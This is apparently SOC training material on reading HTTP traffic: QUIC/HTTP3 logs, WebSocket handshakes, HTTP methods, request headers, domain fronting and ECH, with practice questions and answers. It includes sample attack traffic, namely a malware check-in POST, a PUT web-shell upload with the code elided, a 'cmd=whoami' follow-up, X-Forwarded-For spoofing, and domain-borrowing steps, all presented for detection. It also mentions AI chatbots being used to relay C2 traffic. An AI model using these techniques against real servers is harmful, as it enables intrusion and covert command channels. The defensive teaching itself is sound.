QUIC encrypts most of its packets, headers included. But the connection-opening Initial packet is protected only by keys anyone can derive (from the connection ID), so network sensors can read the TLS ClientHello inside — i.e. the SNI (site name), unless ECH is used. Zeek's QUIC analyzer, added in Zeek 6.1, records it in quic.log:

{
  "ts": "2026-11-04T13:40:12.502Z",
  "uid": "CQx9aW2Z7mL1kd3Fe",
  "id.orig_h": "10.1.5.23",
  "id.orig_p": 53727,
  "id.resp_h": "203.0.113.44",
  "id.resp_p": 443,
  "version": "1",
  "client_initial_dcid": "95412c47018cdfe8",
  "server_scid": "d5412c47018cdfe8",
  "server_name": "media.example.com",
  "client_protocol": "h3",
  "history": "ISisH"
}
Field Meaning id.orig_h / id.resp_h / id.resp_p Our PC / server IP / port (UDP 443) version QUIC version (1 = RFC 9000, quicv2 = version 2) client_initial_dcid Connection ID the client randomly generated to start server_scid Connection ID the server chose server_name SNI — the site name. The most useful field here client_protocol First ALPN value in the ClientHello; h3 = HTTP/3 history Letters summarising the QUIC packet flow (like conn.log's history)

Paths, headers and status codes aren't visible. For HTTP/3 the network limit is "which site, how much, how often"; the rest comes from decryption devices or endpoints.

docs.title: How organisations handle QUIC
docs.text:
Many organisations:

  1. Block outbound UDP 443 at the firewall. Browsers give up on HTTP/3 and fall back to TCP+TLS (HTTP/2), so existing TLS-inspection proxies and logs keep working. Users notice little more than a slight slowdown.
  2. Disable QUIC by browser policy (e.g. the Chrome/Edge QuicAllowed policy).
  3. Treat any remaining attempts to send on UDP 443 as worth checking — something other than the browser (another QUIC app, a remote-access tool, malware) is sending them.

docs.title: QUIC carries more than HTTP
docs.text:
QUIC isn't web-only. Windows SMB over QUIC carries file sharing (SMB) across the internet on UDP 443 without a VPN. In 2022 it was limited to Windows 11 and Windows Server 2022 Azure Edition, but from Windows Server 2025 it's available in the regular editions too. So "UDP 443 = web" can be wrong, and outbound QUIC may contain file sharing.

[Added] On the attack-tool side, some open-source C2 frameworks (e.g. Merlin) support HTTP/2 and HTTP/3 transports. Where UDP 443 is open, it can become a C2 channel that sidesteps TCP-based inspection.

docs.title: [Added] WebSocket
docs.text:
What it is. HTTP is "customer asks, kitchen answers", so the server can't speak first. For services where both sides talk whenever they like — chat, live notifications, stock tickers — WebSocket starts as HTTP and then upgrades to "let's keep the line open like a phone call". URLs use ws:// (unencrypted) and wss:// (TLS).

GET /chat HTTP/1.1
Host: chat.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13

HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
  • Upgrade: websocket + Connection: Upgrade — "let's switch to WebSocket"
  • Sec-WebSocket-Key — a random value from the client (Base64); not a security secret but a greeting to confirm a real WebSocket server
  • Sec-WebSocket-Version: 13 — the current standard (RFC 6455)
  • 101 Switching Protocols — accepted
  • Sec-WebSocket-Accept — the server's answer computed from the Key with a fixed value; if it matches, the connection is established

SOC view. After 101, traffic flows as WebSocket frames, not HTTP requests/responses, so proxy and web logs usually keep only the initial handshake line. The connection can stay open for hours with nothing more in the HTTP logs — attractive for C2. Detect with:

  • Very long-lived connections (hours) in connection logs such as conn.log, and their destinations' reputation
  • WebSocket handshakes to never-seen or newly registered domains
  • Whether the process making the connection is a browser (Sysmon Event ID 3)

docs.title: HTTP section wrap-up
docs.text:
HTTP carries web pages, email, messaging, social networks, calendars — and malware. Reading and interpreting requests and responses is everyday analyst work. The core of this section:

You need to Page Break a URL into protocol, host, path and parameters Web Servers, URLs and GET Understand how server-side scripts change responses (incl. web shells) Web Servers, URLs and GET Know GET, POST and the other methods POST, Other Methods and Request Headers Interpret status codes Response Headers and Status Codes Know the key request and response headers (Host, User-Agent, Referer, method, MIME type) Request headers, Response headers Spot what's odd in headers at a glance Judging Requests, Header Reading Practice Understand new standards (WebSocket, HTTP/2, HTTP/3/QUIC) This page

Plenty of malware hides as "well-behaved, protocol-compliant HTTP", so noticing what's off in headers is a core skill. At the same time, with encryption now the default, less and less is visible without decryption (TLS inspection) and endpoint records.

docs.title: 2026 perspective
docs.text:
[Still valid in 2026]

"New standards keep the meaning and change the delivery", "one transaction = IP + connection + stream ID" and "without decryption you see less and less" all hold. As predicted, HTTP/2 and HTTP/3 are now the norm: per W3Techs, 41.2% of websites support HTTP/3 as of November 2026.

[Changed]

  • Tools have caught up. Wireshark decrypts and displays QUIC and HTTP/3 given session keys, and has Follow → HTTP/2 Stream. Zeek writes quic.log from version 6.1.
  • Server push is effectively gone, replaced by 103 Early Hints.
  • HTTP/2 itself became an attack vector. 2023's "Rapid Reset" (CVE-2023-44487) opened and immediately cancelled (RST_STREAM) streams at enormous speed, producing record-breaking DDoS attacks; in 2024 an attack sending endless CONTINUATION frames was disclosed. Patching web servers' and proxies' HTTP/2 implementations matters.
  • SMB over QUIC reached the regular editions in Windows Server 2025. UDP 443 may carry non-web traffic.
  • ECH is now a standard (RFC 9849, March 2026). The SNI readable in QUIC's Initial packet disappears when ECH is used (Domain fronting and ECH).

[Caution] / [Correction]

  • [Correction] "Methods differ significantly in HTTP/2 and HTTP/3" is a misconception. Methods, paths and status codes mean the same; the request line and Host just became pseudo-headers.
  • Watching TCP only misses QUIC entirely. Set an outbound UDP 443 policy (block, or allow and log) and watch for attempts outside it.
  • Rules matching capitalised header names can break on HTTP/2. Compare case-insensitively.
  • Don't leave SSLKEYLOGFILE enabled on production PCs. That one file unlocks every encrypted session. An attacker who controls a PC could set it to harvest keys too, so the variable being set on a non-lab PC is worth checking.

docs.title: Question 1
docs.text:
In a decrypted HTTP/2 capture, these frames appear in order on the same TCP connection:

HEADERS[7]: GET /report.pdf
HEADERS[9]: GET /update.bin
HEADERS[9]: 200 OK
DATA[9]
HEADERS[7]: 200 OK
DATA[7]
DATA[9]

(a) Which frames carry the contents of update.bin? (b) How do you narrow Wireshark to just this transaction?

Answer and explanation

(a) The DATA frames of stream 9 — lines 4 and 7. In HTTP/2, frames from different streams interleave, so you pair them by stream ID, not order. report.pdf is stream 7 (the DATA on line 6).

(b) Specify both the connection and the stream:

tcp.stream == N && http2.streamid == 9

N is Wireshark's number for this TCP connection. Other TCP connections may also have a stream 9, so narrow by IP + TCP connection + stream ID. Then use Follow → HTTP/2 Stream to read headers and body, or Export Objects to extract the file.

docs.title: Question 2
docs.text:
The organisation decides to block outbound UDP 443 at the firewall. (a) What happens to Chrome users, and why would the security team do this? (b) If a PC keeps trying to send to external UDP 443 afterwards, what should you suspect?

Answer and explanation

(a) Chrome notices HTTP/3 (QUIC) fails and quietly falls back to TCP+TLS (HTTP/2); users barely notice (perhaps slightly slower). The reason: TCP+TLS traffic is handled by the existing TLS-inspection proxy, proxy logs and web filters, while QUIC easily bypasses them. The browser policy (QuicAllowed off) is usually applied too.

(b) Browsers have already fallen back to TCP, so whatever keeps trying UDP 443 is not the browser:

  • Other legitimate QUIC apps (some video-conferencing or streaming apps)
  • SMB over QUIC (file sharing with an external file server)
  • C2 malware with QUIC/HTTP/3 transport

Check the destination via the firewall's block records and Zeek quic.log's server_name, and identify which process sent it via Sysmon Event ID 3.

docs.title: Question 3
docs.text:
One PC shows the records below. Interpret them and say what to do next.

http.log:  GET /ws  Host: live-feed.example.net  Upgrade: websocket  status=101
conn.log:  10.1.5.88 → 198.51.100.20:443  duration=9h12m  orig_bytes=184,320  resp_bytes=97,280
Answer and explanation

Interpretation: the PC opened a WebSocket to live-feed.example.net (Upgrade: websocket → 101), and the connection stayed open over nine hours. Everything after 101 was WebSocket frames, so the HTTP log has only the first line while the connection log shows a long duration and modest byte counts. It could be a legitimate service (chat, live feed) or a long-lived C2 channel.

Next:

  1. Destination reputation — live-feed.example.net and its IP: reputation, registration date, first seen in the organisation?
  2. Which process — Sysmon Event ID 3: a normal browser tab, or an unfamiliar program in AppData or similar?
  3. Compare with human activity — was the user actually working during those nine hours? (Open after hours or overnight is more suspicious.)
  4. Data pattern — WebSocket frame content if TLS inspection is available; otherwise whether it looks like small signals at regular intervals (a beacon)
  5. Other PCs opening WebSockets to the same destination

docs.title: POST, Other Methods and Request Headers
POST, Other Methods and Request Headers
docs.text:
What this page covers

What POST is and why its body doesn't show up in logs — and therefore why malware and web shells love it. The six other methods (CONNECT, HEAD, OPTIONS, PUT, DELETE, TRACE) and how each is abused. Reading request headers (Host, User-Agent, Referer, Cookie, Accept, X-Forwarded-For) to pick out odd requests. Practice questions with answers (including common mistakes) are at the end.

Labels

[Added] = practical must-know, [Correction] = fixes a commonly stated mistake, [Changed]/[Caution] = what changed recently and what is risky if done the old way. The previous page is Web Servers, URLs and GET.

docs.title: Ten key points
docs.text:
1. If GET is "please give me this", POST is "please take this". Data goes in the body (inside the parcel), not the address.
  2. Web server and proxy logs usually don't record the body — but not logged ≠ nobody can see it. Over http, full packet capture shows everything.
  3. Malware and careful web shells use POST. No Referer + no preceding GET + Base64 body + fixed interval = beacon.
  4. CONNECT asks a proxy to "open a tunnel". Without TLS inspection, an HTTPS visit is a single CONNECT line in the proxy log.
  5. HEAD and OPTIONS are used for reconnaissance. Hundreds of external HEAD 404s with a few 200s = check those files first.
  6. Inbound PUT + 201/2xx + executable type (.jsp, .aspx, .php) = check for a web-shell upload first.
  7. A method name that isn't in the standard is a strong anomaly on its own.
  8. Host tells you which site (virtual hosting). User-Agent and X-Forwarded-For are values anyone can fake.
  9. A cookie is a login wristband; steal it and you skip both password and MFA. The same session suddenly used from another country or device is suspicious.
  10. Look at patterns (interval, order, surrounding requests, header-order fingerprints), not single headers.

docs.title: POST = "please take this"
docs.text: Why it exists. GET writes data into the address — like squeezing a message into the address line of a postcard: short only, visible to everyone, and logged verbatim. For logins, long text or files you need a parcel: a short address on the outside (URL) and the contents inside (the body). That's POST, the second most important method after GET.

docs.title: What it looks like
docs.text:
Clicking "Log in" on a login form sends:

POST /login.php HTTP/1.1
Host: app.corp.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Chrome/141.0.0.0 Safari/537.36
Referer: https://app.corp.local/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

username=jsmith&password=Winter2026%21
  1. POST /login.php HTTP/1.1 — "I'm sending something to /login.php". No ? and no parameters in the address
  2. Host — which site
  3. User-Agent — introduces itself as Chrome
  4. Referer: https://app.corp.local/login.php — "I was looking at the login page when I sent this": a person opened the page → typed → clicked (compare with the malware example below)
  5. Content-Type: application/x-www-form-urlencoded — how the parcel is packed: "form values as name=value&name=value"
  6. Content-Length: 38 — the contents are 38 bytes; the last line is exactly 38 characters
  7. Blank line — "end of outside labels, contents follow"
  8. username=jsmith&password=Winter2026%21 — the body; same rules as GET parameters, %21 = !

docs.title: What gets logged
docs.text:
With GET the password ended up in the log (GET logging example). With POST:

10.1.5.23 - - [28/Oct/2026:20:15:02 +1100] "POST /login.php HTTP/1.1" 302 215 "https://app.corp.local/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ..."

The request line stops at POST /login.php — no password. Web servers and proxies normally record the first line and some headers, not the body.

[Caution] Not logged ≠ nobody can see it

Sent over http (a postcard), the full contents appear in full packet capture (PCAP). WAFs and some EDR products can see the body too. POST means "less in the web log", not a substitute for encryption (https).

docs.title: Attackers love POST too
docs.text:
What's convenient for defenders is convenient for attackers. Malware uses POST to avoid detection and encodes or encrypts the body so that even if it's found, it isn't clear what happened. When a body that should be human-readable is wrapped up, ask "why?"

Scene 1: malware reporting in (check-in).

POST /gate.php HTTP/1.1
Host: update-check-service.example.org
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

data=aG9zdD1hZG1pbi1QQzEmb3M9V2luMTEmdXNlcj1qc21pdGg=
Clue Why it's suspicious /gate.php A name long associated with botnet control panels — a clue, not proof No Referer A program sent it directly; nobody was looking at a page. There'll be no earlier GET of that site's page either MSIE 8.0 + Windows NT 6.1 Internet Explorer 8 on Windows 7 — impossible on a 2026 corporate PC Unreadable text after data= Base64. Decodes to host=admin-PC1&os=Win11&user=jsmith — the infected PC reporting its details Repeats on a fixed interval Beacon

Real malware often encrypts on top of Base64, so decoding may yield gibberish — but the fact that it decodes as valid Base64 is itself a clue.

Scene 2: careful web shells use POST. A web shell that takes commands via GET leaves them in the IIS log (c=ipconfig+/all). A careful attacker puts commands in the POST body, so IIS logs only:

2026-10-28 09:42:11 10.20.1.15 POST /uploads/avatar.aspx - 443 - 185.220.101.4 Mozilla/5.0 200 0 0 298

The query field is - (empty), so the web log can't tell you the command. Two ways forward:

  • Host-side Event 4688 / Sysmon 1: w3wp.exe → cmd.exe and its command line (web-shell detection)
  • Treat the pattern itself as suspicious: repeated POSTs to a file in an images folder, each returning 200. Nobody POSTs to a normal image

[Added] Large POSTs signal exfiltration. POST bodies have practically no size limit (server-dependent), so they're used to move data out. A POST with a Content-Length of hundreds of MB to a never-seen external site deserves a look. File uploads usually use Content-Type: multipart/form-data — a parcel with dividers, one file or value per compartment.

docs.title: The six other methods
docs.text:
HTTP/1.1 defines six more methods besides GET and POST. They're rare day to day but appear when investigating attacks coming into our own web servers. Even a standards-compliant server only has to implement GET and HEAD; the rest are optional.

Method In one line Attack / investigation angle CONNECT Ask a proxy to open a tunnel HTTPS appears as one CONNECT line; CONNECT to ports other than 443 = bypass attempt HEAD "Just the label, not the contents" Scanners checking whether files exist OPTIONS "Which methods can I use?" Pre-attack recon — but also common in normal traffic (CORS preflight) PUT "Put this file at this path" Web-shell upload; inbound PUT + 2xx = top priority DELETE "Delete this file" Possible clean-up of traces TRACE "Echo back what I sent" Old XST attack; effectively dead, still disable it

docs.title: CONNECT — "please open a tunnel"
docs.text:
Company PCs often reach the internet through a proxy (a gatehouse-style intermediary). Because HTTPS is encrypted, the PC first has to ask the gatehouse "please connect me to Google through a private tunnel". That request is CONNECT.

CONNECT www.google.com:443 HTTP/1.1
Host: www.google.com:443

HTTP/1.1 200 Connection established
  • Line 1: "connect me to Google's door 443" — host:port instead of a path
  • Last line: the proxy's reply, "tunnel open". Everything after that is encrypted and invisible to the proxy (without TLS inspection)

SOC angle. Without TLS inspection, almost every HTTPS visit appears in the proxy log as a single CONNECT line: you know who opened a tunnel to which domain and port, and when — but not which pages were viewed or what was downloaded. CONNECT is meant for 443; entries like CONNECT 198.51.100.7:22 (SSH) or :25 (mail) may be someone using the proxy as a bypass tunnel.

docs.title: HEAD — "just the label, not the contents"
docs.text:
Returns exactly what GET would, minus the body. Its purpose is checking whether a file has changed so a cached copy can be reused — like phoning the shop to ask "is it in stock?" without going there.

HEAD /files/report.pdf HTTP/1.1
Host: www.example.com

HTTP/1.1 200 OK
Content-Type: application/pdf
Content-Length: 482113
Last-Modified: Mon, 26 Oct 2026 03:10:00 GMT

File type (PDF), size (482,113 bytes) and last-modified time — no body.

[Added] HEAD as a recon tool. Automated scanners use HEAD to quickly knock on files people leave behind by mistake: /backup.zip, /db.sql, /.git/config. Hundreds of HEADs from one external IP, mostly 404 with a few 200s, means check the files that returned 200.

docs.title: OPTIONS — "which methods can I use here?"
docs.text:
OPTIONS / HTTP/1.1
Host: www.example.com

HTTP/1.1 200 OK
Allow: GET, POST, HEAD, OPTIONS, PUT, DELETE

The Allow line is the answer: this server accepts PUT and DELETE. To an attacker that's a hint — "maybe I can upload a file" — so OPTIONS often shows up during reconnaissance.

[Changed] Plenty of OPTIONS are normal. When a page calls an API on another domain, the browser first sends OPTIONS to ask permission (CORS preflight). So it's not "OPTIONS = suspicious"; look for an external IP spraying OPTIONS across many paths.

docs.title: PUT — "put this file at this path"
docs.text:
The most attack-relevant of the six. Because of the recipe-folder principle, if a server wrongly allows PUT, the attacker doesn't even need a flawed upload form:

PUT /shell.jsp HTTP/1.1
Host: www.example.com
Content-Length: 412

<% ... malicious code that runs commands ... %>

"Place this content at /shell.jsp." If the server replies 201 Created, 200 or 204, the web shell is in place, and next comes GET /shell.jsp?cmd=whoami. Apache Tomcat (a Java web server) has had several PUT-related vulnerabilities used to upload web shells or malicious files (CVE-2017-12617 in 2017, CVE-2025-24813 in March 2025). Inbound PUT + 201/2xx is a top-priority check.

docs.title: DELETE — "delete this file"
docs.text:
Asks the server to delete the resource at the path. Rare in incidents, but an attacker might use it to remove files they uploaded. If an external DELETE succeeded, find out what was deleted.

[Changed] PUT, DELETE and PATCH are normal in APIs. REST APIs split work into "read = GET, create = POST, update = PUT/PATCH (partial update), delete = DELETE". So rather than the method itself, ask whether this app normally uses it, and whether the path is an API route or an executable file in a web folder (.jsp, .aspx, .php).

docs.title: TRACE — "echo back what I sent"
docs.text:
The server returns the request it received in the body — an application-layer loopback, meant for checking how proxies along the way changed a request.

[Added] XST (Cross-Site Tracing). Browser cookies can be protected from page scripts, but in the past TRACE was used to echo back a request containing those cookies, bypassing the protection. Modern browsers stop page scripts from sending TRACE, so the attack is effectively gone. Scanners still flag "TRACE enabled", and since nobody needs it, disable it.

docs.title: Malware doesn't follow the rules
docs.text: Method names only mean something when a normal browser talks to a normal server. Malware on an infected PC and the attacker's server are both written by the attacker, so they can use non-standard names like BEACON / or GETT / and still understand each other. Conversely, a method that isn't in the standard list is a strong anomaly on its own.

docs.title: Reading request headers
docs.text:
Headers are the name: value notes under the first line — the shipping label on the parcel. Even when the contents are encrypted or wrapped, the label is fairly easy to read, which makes headers an analyst's most useful clues.

Header In one line Host Which domain (site) was visited — the most important User-Agent The requesting program's self-introduction Referer The previous page (the misspelling became the standard) Cookie Customer-identifying data from earlier visits Accept* Acceptable file types, languages and compression X-Forwarded-For "Original sender" note added by proxies / load balancers

Example — a user clicks a shop link in Google results:

GET /products/shoes?id=1032 HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Referer: https://www.google.com/
Cookie: session_id=8f3a91c2e7b44d0e; cart=2
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-AU,en;q=0.9,ko;q=0.8
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

docs.title: Four questions to ask
docs.text:
For each HTTP request, go field by field:

  1. Host — does the domain look safe? (apply the DNS domain signals)
  2. User-Agent (request) / Server (response) — do I recognise this software? Is it common here? Do we actually run it, on the right OS and version?
  3. Path — do the folder and file names and GET parameters look random, phishy or encoded?
  4. Content — anything unusual, like unnecessary encoding? Anything long, random or needlessly encoded is suspect

docs.title: Host — "which household you came to see"
docs.text: The IP is the apartment block; hundreds of sites live in it. The server reads Host — "ah, a customer for shop.example.com" — and serves that site. This is virtual hosting. For analysts too, the IP alone doesn't tell you which site was visited; Host does. That's why Zeek stores host separately.

docs.title: [Added] Domain fronting and how it evolved (2026)
docs.text:
Classic domain fronting. In HTTPS the outside of the envelope (SNI) and the Host inside are separate. An attacker writes a trusted, famous site on the outside and their C2 site in the inner Host; the firewall only checks the outside, and the CDN reads the inner Host and delivers to the attacker's site (MITRE ATT&CK T1090.004).

The big clouds responded with "refuse delivery if the outer and inner names differ" — but not every CDN did.

CDN Status Google, AWS CloudFront Blocked from around 2018 (CloudFront returns 421 on a mismatch) Microsoft Azure (Front Door/CDN) Blocking announced late 2022, enforced for existing customers from January 2024 Cloudflare No successful fronting in a 2023 measurement study Fastly Still possible when tested in March 2025 (SNI and Host not compared) Other CDNs 22 of 30 tested (~73%) still allowed it in a 2023 study, including Akamai and Fastly

Variant 1: Domain Borrowing. Published in 2021 to get past the "SNI ≠ Host → refuse" check.

  1. A reputable bigcorp.com already uses a CDN that holds a *.bigcorp.com wildcard certificate
  2. The attacker opens their own account on the same CDN and adds an unused name such as cdn-update.bigcorp.com as "their" site. Some CDNs did not verify ownership
  3. When an infected PC connects, SNI and Host are both cdn-update.bigcorp.com and the certificate is genuine → it passes the "SNI = Host?" check, yet the CDN delivers to the attacker's server

It's like a building manager handing an empty flat bearing someone else's building name to a stranger without checking. The specific CDN flaws were most likely reported and fixed, but the root cause — weak domain-ownership checks at CDNs and clouds — keeps recurring. It belongs to the same family as DNS subdomain takeover.

Variant 2: same-account crossing and CDN-chaining. These are research directions rather than one named technique.

  • Same-account crossing: some CDNs check not "are the outer and inner names identical?" but "do both belong to the same customer account?". Fronting between that account's domains still works. To use it, an attacker must take over a customer account that owns a reputable domain, so it appears alongside account compromise.
  • CDN chaining: putting one CDN in front of another, or multi-CDN setups, where each hop checks names differently. Mostly research; no widely reported real-world attacks found.

[Still valid in 2026] What attackers use more often. Rather than elaborate fronting, they simply create their own address on a trusted service, where outer and inner names match and nothing needs faking: Cloudflare Workers/Pages, Cloudflare tunnels (trycloudflare.com), free cloud subdomains such as *.azurefd.net, and the Telegram/Discord/Slack APIs. In February 2026 a proof of concept (a demonstration, not an observed attack) showed AI chatbots' web-browsing features (Grok, Copilot) relaying C2 traffic. The common thread is borrowing reputation; domain fronting is just one way to do it.

ECH (Encrypted Client Hello): the "official" version of fronting. A TLS 1.3 extension that encrypts the real site name with a public key fetched from the DNS HTTPS record (type 65). It became a standard as RFC 9849 in March 2026.

Outer ClientHello (visible):  SNI = cloudflare-ech.com     ← cover name, shared by many sites
Inner ClientHello (encrypted): SNI = real-c2-site.example  ← hidden
IP layer (visible):           10.1.5.23  →  104.21.x.x     ← source and destination IP still visible
  • Line 1: the outside shows a shared cover name (cloudflare-ech.com for Cloudflare)
  • Line 2: only the real site name is encrypted
  • Line 3: source and destination IPs, volume, timing and interval remain visible

[Correction] Common misconceptions about ECH

  • "It hides source and destination" is overstated. Only the hostname is hidden. You still see which apartment block (IP) traffic goes to — just not which flat.
  • It's closer to "fronting sanctioned by the CDN" than a replacement for fronting. It looks similar, but it's a CDN feature: an attacker must put C2 behind an ECH-capable service (in practice, Cloudflare), and the CDN sees the real name. It only hides from the company firewall in the middle.
  • It isn't widespread yet. Per Corrata's May 2025 report, just under 10% of the top 1M sites support it (almost all Cloudflare), and only ~0.06% of connections used it (Jan–Mar 2025). Malicious or risky sites were over-represented at ~17% of ECH-enabled sites, and over 90% of phishing detections on ECH sites were on Cloudflare.
  • Browsers only use ECH with encrypted DNS. Chrome needs secure DNS on and a published ECH key; Firefox 119+ needs DoH on.
  • No widely reported malware using ECH to hide C2 was found. With phishing already concentrated on ECH sites, assume it is coming.

SOC response.

  • Classic fronting: with TLS inspection, alert on SNI ≠ Host
  • Domain borrowing / reputation borrowing: SNI = Host, so that check misses it → look for never-seen subdomains of reputable domains, beacon-like fixed intervals, and traffic when nobody is at the desk. Clean up unused CDN configurations and dangling CNAMEs so your own domains can't be borrowed
  • ECH: the key fact is that ECH is almost useless without encrypted DNS
    • Force company DNS and block external DoH and browsers won't turn ECH on
    • Even if ECH is used, company DNS logs show which domain's HTTPS (65) and A records were queried → that is the real site name
    • Firewall ECH-blocking features (offered by major vendors such as Cisco) or browser policy can disable ECH; browsers then reconnect with a plain SNI
    • The cover name cloudflare-ech.com stays visible (Russia used exactly this to block ECH in November 2024)
    • Names may be hidden, but IP, timing, interval and volume are not — beacon detection and EDR / Sysmon Event ID 3 (which program connected where) still work

docs.title: User-Agent — the program's self-introduction
docs.text:
Mozilla/5.0                       ← historical prefix (almost every browser says this)
(Windows NT 10.0; Win64; x64)     ← OS: Windows, 64-bit
AppleWebKit/537.36 (KHTML, like Gecko)  ← rendering engine family
Chrome/141.0.0.0                  ← actual browser and version
Safari/537.36                     ← compatibility tag

Chrome mentions Mozilla, Safari and Gecko because old sites favoured particular browsers, so newer browsers kept adding "me too" names. The real identity is Chrome/141.

Suspicious User-Agents:

python-requests/2.32.3
curl/8.9.1
Go-http-client/1.1
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Mozila/5.0 (Windows NT 10.0; Win64; x64)
(empty)
  • Lines 1–3: default self-introductions of a Python program, the curl tool and a Go program. Fine from developers or admin scripts; worth checking from an ordinary office PC going outbound
  • Line 4: an obsolete browser (IE8 on Windows 7) that can't exist in 2026
  • Line 5: Mozilla misspelt as Mozila — a typo from someone faking it by hand
  • Line 6: empty. Real browsers never leave it blank

[Caution] A User-Agent is a self-introduction, not an ID card

Anyone can write anything. Skilled attackers mimic a perfect current Chrome. An odd value is grounds for suspicion; a normal value is not grounds for reassurance.

[Changed] User-Agent Reduction. Chrome now reports Windows NT 10.0 even on Windows 11 and freezes minor versions at 0.0.0. You can't tell Windows 10 from 11 by User-Agent alone; the detail moved to Client Hints headers (Sec-CH-UA…), sent only on request.

docs.title: Referer — the "where I came from" note
docs.text:
The previous page's address. Referer: https://www.google.com/ means "I clicked through from Google results". It's spelt Referer, not Referrer, because a typo in a 1990s standard stuck. The later policy header Referrer-Policy uses the correct spelling — mix them up when searching logs and you'll get no results.

Referer is the footprint showing how a user reached a malicious site:

1) GET https://outlook.office.com/mail/...                      Referer: (none)
2) GET http://q8z3k1vt.shady-host.eu/38104p5h2c                 Referer: https://outlook.office.com/
3) GET http://q8z3k1vt.shady-host.eu/PVfXBbR9WReNMmb...         Referer: http://q8z3k1vt.shady-host.eu/38104p5h2c
  1. The user opens webmail
  2. Clicks a link in an email to a dodgy site (Referer = webmail)
  3. That site moves them on to the next page — the malicious file (Referer = page 2)

→ You can prove "phishing email → click → malicious download". Gibberish subdomains and long random paths are typical of exploit kits. If the Referer is a Google search, suspect SEO poisoning (pushing malicious sites up the results).

Referer isn't always present: typing the address or using a bookmark sends none. Modern browsers send only the domain when moving to another site, so step 2 showing just https://outlook.office.com/ is normal.

docs.title: Cookie — the theme-park wristband
docs.text:
HTTP has no memory; every request is a stranger. At a theme park, staff check your ticket (login) and give you a wristband (Set-Cookie in the response); after that you just show the band at each ride (Cookie in the request).

Cookie: session_id=8f3a91c2e7b44d0e; cart=2 = two cookies separated by ;: session_id is the login band number, cart=2 a note that the cart holds two items.

Steal the wristband, skip the ticket check. An attacker with the login cookie gets in as that person with no password and no MFA (session hijacking). [Still valid in 2026] Infostealer malware harvests browser cookies wholesale for sale, and AiTM (Adversary-in-the-Middle) phishing pages log in for the victim and capture the cookie. Many "we had MFA and still got breached" incidents are exactly this. The same session cookie suddenly used from another country's IP or another User-Agent is a key detection.

Malware hides data in cookies. Cookies are supposed to look long and random, which makes them hard to judge — and attackers exploit that. Cobalt Strike, a common attack framework, by default sends the infected host's details Base64-encoded in the Cookie header. A single long Base64 blob with no name, or a cookie that changes on every request to a never-seen domain, is worth a look.

docs.title: The Accept family — "in this format, please"
docs.text:
Accept (file types), Accept-Language (languages) and Accept-Encoding (compression) are grouped as Accept*.

Accept-Language: en-AU,en;q=0.9,ko;q=0.8 → Australian English, then English (preference 0.9), then Korean (0.8). q is a preference weight; 1 is highest and the default.

[Correction] It's often said that "the first item listed is preferred". Strictly, preference is set by the q weight, not the order; browsers just happen to list them in weight order.

Two uses:

  • An inbound attack request whose Accept-Language is a tool default or missing suggests an automated tool rather than a person
  • Accept-Encoding: gzip means the response arrives compressed; when carving a file out of a packet capture by hand you must decompress it to get the original (most tools do this automatically)

docs.title: X-Forwarded-For — the "original sender" note
docs.text:
When a request passes through a proxy or a load balancer (the desk that spreads customers across servers), the server sees every connection coming from the intermediary's IP. The intermediary adds a note — "the original customer was this IP" — called X-Forwarded-For (XFF).

Web server log -> client IP: 10.0.0.5          (our load balancer)
Request header -> X-Forwarded-For: 203.0.113.77 (the real visitor)

Miss this and you'll conclude "the attacker is one of our internal devices". The note is only added after the intermediary, so it's visible on the server side, not in a capture on the user's PC.

[Caution] Clients can forge XFF

An attacker can send X-Forwarded-For: 127.0.0.1 (the server itself), and a sloppy app may decide "internal request" and open admin functions. Intermediaries append the real IP after whatever is already there, so trust only the value your own intermediary added last (usually the right-most).

docs.title: Header order and terminology
docs.text:
Header order is arbitrary and shouldn't change the response.

[Added] Order becomes a fingerprint. Chrome, Firefox and Edge always write headers in their own consistent order. Malware that fakes a Chrome User-Agent often fails to match Chrome's header order and set. Fingerprinting techniques catch "says Chrome, doesn't talk like Chrome" — JA4H (an HTTP client fingerprint) is one example. You can fake a name more easily than a speech habit.

[Changed] "Entity headers" is no longer the term. Older material split headers into entity headers describing the body (Content-Type, Content-Length) and request headers unrelated to it (Cookie, User-Agent, Referer). The idea is still useful, but since the HTTP standard was reorganised in June 2022 (RFC 9110) the official terms are "representation" / "content" headers.

docs.title: 2026 perspective
docs.text:
[Still valid in 2026]

The GET/POST difference, POST bodies being absent from web logs, malware's POST + Base64 habit, and the four header questions all remain good basic habits.

[Changed]

  • Cookies are now a bigger target than passwords. With MFA everywhere, attackers steal post-login cookies (infostealers, AiTM). Watch for the same session used from a different place or device.
  • Less information in User-Agent. User-Agent Reduction hides Windows 10 vs 11 and minor versions; details moved to Client Hints (Sec-CH-UA).
  • Normal traffic looks different. OPTIONS (CORS preflight), PUT, PATCH and DELETE are routine in REST APIs; per-app baselines matter more.
  • Terminology. "Entity header" is no longer an official term after RFC 9110.
  • Domain fronting evolved into "reputation borrowing". Big clouds blocked it, some CDNs still allow it, and domain borrowing (SNI = Host), own addresses on trusted services, and ECH (RFC 9849, March 2026) have appeared. Details
  • PUT-related bugs keep appearing. Apache Tomcat CVE-2025-24813 (March 2025) could lead to remote code execution via PUT in certain configurations, with exploitation attempts reported soon after disclosure.

[Caution] / [Correction]

  • [Correction] "Methods differ significantly in HTTP/2 and HTTP/3" is misleading. Method names and meanings are unchanged. What changed is the carriage: the text request line and Host become pseudo-headers (:method, :path, :authority) and everything is binary-framed and compressed. Once a tool decodes it, read it exactly the same way. Only CONNECT gained extended variants for WebSockets and UDP tunnels.
  • Don't stop at "it was a POST, so it's not in the log". Go to host logs (4688, Sysmon), WAF and full packet capture.
